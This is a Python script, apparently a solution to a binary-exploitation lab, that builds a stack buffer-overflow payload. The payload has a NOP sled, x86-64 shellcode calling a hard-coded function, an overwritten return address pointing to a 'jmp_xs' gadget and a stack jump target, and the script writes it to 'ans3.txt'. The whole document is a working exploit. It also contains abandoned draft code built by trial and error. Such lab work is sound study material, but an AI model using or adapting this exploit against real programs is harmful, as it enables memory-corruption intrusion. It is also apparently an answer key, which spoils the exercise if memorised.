import struct

# 更大的nop sled
nop_sled = b"\x90" * 100

# Shellcode
shellcode = b""
shellcode += b"\x48\xc7\xc7\x72\x00\x00\x00"  # mov rdi, 0x72
shellcode += b"\x48\xb8\x16\x12\x40\x00\x00\x00\x00\x00"  # mov rax, 0x401216
shellcode += b"\xff\xd0"  # call rax

# 估计的缓冲区地址（可能需要调整）
buffer_addr = 0x7fffffffdba0

# 使用nop sled，我们不需要精确地址
# 跳转到nop sled中间即可
target_addr = buffer_addr + 50  # 跳到nop sled中间

payload = b""
# nop sled + shellcode
payload += nop_sled
payload += shellcode

# 填充到40字节
payload += b"A" * (40 - len(payload))

# 返回地址: jmp_xs
payload += struct.pack("<Q", 0x401334)

# 填充到偏移0x40
payload += b"B" * (64 - len(payload))

# 但我们需要修改偏移0x40处的值
# 重新构造...

# 简化：直接构造64字节payload
payload = b""
# 前32字节：nop sled + shellcode
payload += nop_sled[:32-len(shellcode)]
payload += shellcode
# 覆盖保存的rbp
payload += b"A" * 8
# 返回地址
payload += struct.pack("<Q", 0x401334)
# 填充并设置跳转地址
payload += b"B" * 8
payload += struct.pack("<Q", target_addr)
payload += b"C" * 8

with open("ans3.txt", "wb") as f:
    f.write(payload)

print("Payload written with nop sled")